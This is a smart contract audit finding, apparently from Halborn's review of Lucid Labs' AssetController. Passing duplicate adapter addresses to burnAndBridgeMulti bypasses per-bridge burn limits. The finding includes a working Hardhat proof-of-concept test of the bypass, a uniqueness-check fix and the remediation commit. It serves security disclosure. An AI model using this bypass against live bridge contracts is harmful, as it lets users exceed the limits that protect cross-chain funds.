---
# Core Classification
protocol: Contracts V1
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 52250
audit_firm: Halborn
contest_link: https://www.halborn.com/audits/lucid-labs/contracts-v1
source_link: https://www.halborn.com/audits/lucid-labs/contracts-v1
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Halborn
---

## Vulnerability Title

Bypass of Bridge Limits in burnAndBridgeMulti Function

### Overview


The AssetController contract allows users to bypass limits for individual bridges by using the burnAndBridgeMulti function. This is due to a lack of verification for duplicate adapter addresses, which can be exploited to exceed intended limits. A proof of concept test has been provided to demonstrate this vulnerability. It is recommended to implement a check for adapter uniqueness in the burnAndBridgeMulti function to prevent this exploit. The issue has been resolved by adding a new function to check for uniqueness.

### Original Finding Content

##### Description

The `AssetController` contract, in the `burnAndBridgeMulti` function, allows users to bypass individual bridge limits. The function does not verify the uniqueness of the provided adapter addresses, enabling users to submit duplicate addresses and bypass the multi-bridge limit system.

```
function burnAndBridgeMulti(
    address recipient,
    uint256 amount,
    bool unwrap,
    uint256 destChainId,
    address[] memory adapters, //E @AUDIT dupplicates not checked
    uint256[] memory fees
) public payable nonReentrant whenNotPaused {
// ... [other code]

    uint256 _currentLimit = burningCurrentLimitOf(address(0));
    if (_currentLimit < amount) revert IXERC20_NotHighEnoughLimits();
    _useBurnerLimits(address(0), amount);

// ... [other code]

    _relayTransfer(transfer, destChainId, adapters, fees);
}
```

  

The function uses a separate limit check for multi-bridge transfers (`burningCurrentLimitOf(address(0))`), which can be exploited to bypass individual bridge limits because there is no verification that the adapters in the adapters array passed as argument to burnAndBridgeMulti (address[] memory adapters) are unique.

  

This vulnerability allows users to exceed the intended limits for individual bridges. An attacker can first use the `burnAndBridge` function to reach the limit of a single bridge, then use `burnAndBridgeMulti` with an array containing only the same bridge address multiple times. This bypasses the individual bridge limit and utilizes the multi-bridge limit (`address(0)`) for the same bridge.

##### Proof of Concept

This test can be found in `AssetController.test.ts` :

```
describe("Halborn_burnAndBridge", () => {
        beforeEach(async () => {
            // await helpers.time.increase(2000);
            relayerFee = ethers.utils.parseEther("0.001");
            amountToBridge = ethers.utils.parseEther("4000");
            // Approval needs to be given because controller will burn the tokens
            await sourceToken.connect(ownerSigner).approve(sourceController.address, amountToBridge);
        });
        /*it("Burn and bridge with address(0) as adapter", async () => {
            //await sourceController.setLimits(ethers.constants.AddressZero, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            //await destController.setLimits(ethers.constants.AddressZero, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            //const tx = await sourceController.burnAndBridge(user1Signer.address, amountToBridge, false, 100, ethers.constants.AddressZero, {
            //    value: relayerFee,
            //});
            await expect(sourceController.burnAndBridge(user1Signer.address, amountToBridge, false, 100, ethers.constants.AddressZero, {
                value: relayerFee,
            })).to.be.reverted;
            
        });*/
        it("Bypass Limits by sending same adapters in array", async () => {
            // await sourceController.setLimits(ethers.constants.AddressZero, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            // await destController.setLimits(ethers.constants.AddressZero, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            // await sourceController.setLimits(sourceBridgeAdapter.address, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            // await destController.setLimits(destBridgeAdapter.address, ethers.utils.parseEther("1000"), ethers.utils.parseEther("1000"));
            
            // can go until 2000 for one bridge
            console.log("[-] burnAndBridge is used until sourceBridgeAdapter => 1000");
            const tx = await sourceController.burnAndBridge(user1Signer.address,ethers.utils.parseEther("1000"), false, 100, sourceBridgeAdapter.address, {
                value: relayerFee,
            });
            await expect(tx).to.emit(sourceController, "TransferCreated");
            
            // Bypass Limits => Revert
            await expect(sourceController.burnAndBridge(user1Signer.address,ethers.utils.parseEther("1"), false, 100, sourceBridgeAdapter.address, {
                value: relayerFee,
            })).to.be.revertedWithCustomError(sourceController, "IXERC20_NotHighEnoughLimits");

            // Use burnAndBridgeMulti with same adapter
            console.log("[-] burnAndBridgeMulti is used to bypass limit of sourceBridgeAdapter => 2000");
            const tx2 = await sourceController.burnAndBridgeMulti(
                user1Signer.address,
                ethers.utils.parseEther("1000"),
                false,
                100,
                [sourceBridgeAdapter.address, sourceBridgeAdapter.address],
                [relayerFee, relayerFee],
                {
                    value: relayerFee.mul(2),
                }
            );
            await expect(tx2).to.emit(sourceController, "TransferCreated");

            await expect(sourceController.burnAndBridgeMulti(
                user1Signer.address,
                ethers.utils.parseEther("6"), //E fees not burned so 1 would not revert
                false,
                100,
                [sourceBridgeAdapter.address, sourceBridgeAdapter.address],
                [relayerFee, relayerFee],
                {
                    value: relayerFee.mul(2),
                }
            )).to.be.revertedWithCustomError(sourceController, "IXERC20_NotHighEnoughLimits");
            
            console.log("[OK] Bypass worked");
        });
        
    });
```

  

Result : 2X the limit of a single Bridge can be used

![BypassOfSingleBridgeLimit.png](https://halbornmainframe.com/proxy/audits/images/6715b4c9b982f55e6251f902)

##### BVSS

[AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U (7.5)](/bvss?q=AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U)

##### Recommendation

It is recommended to implement a check in `burnAndBridgeMulti` to ensure all provided adapter addresses are unique :

```
function checkUniqueness(address[] memory adapters) internal pure returns (bool) {
    uint256 length = adapters.length;
    for (uint256 i = 0; i < length - 1; i++) {
        for (uint256 j = i + 1; j < length; j++) {
            if (adapters[i] == adapters[j]) {
                return false;
            }
        }
    }
    return true;
}
```

##### Remediation

**SOLVED:** A new function `checkUniqueness()` has been added to check for adapters uniqueness.

##### Remediation Hash

<https://github.com/LucidLabsFi/demos-contracts-v1/commit/c0ffed61bf587d9695bef446b22170e04db656fc>

##### References

[LucidLabsFi/demos-contracts-v1/contracts/modules/chain-abstraction/AssetController.sol#L235](https://github.com/LucidLabsFi/demos-contracts-v1/blob/main/contracts/modules/chain-abstraction/AssetController.sol#L235)

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Halborn |
| Protocol | Contracts V1 |
| Report Date | N/A |
| Finders | Halborn |

### Source Links

- **Source**: https://www.halborn.com/audits/lucid-labs/contracts-v1
- **GitHub**: N/A
- **Contest**: https://www.halborn.com/audits/lucid-labs/contracts-v1

### Keywords for Search

`vulnerability`

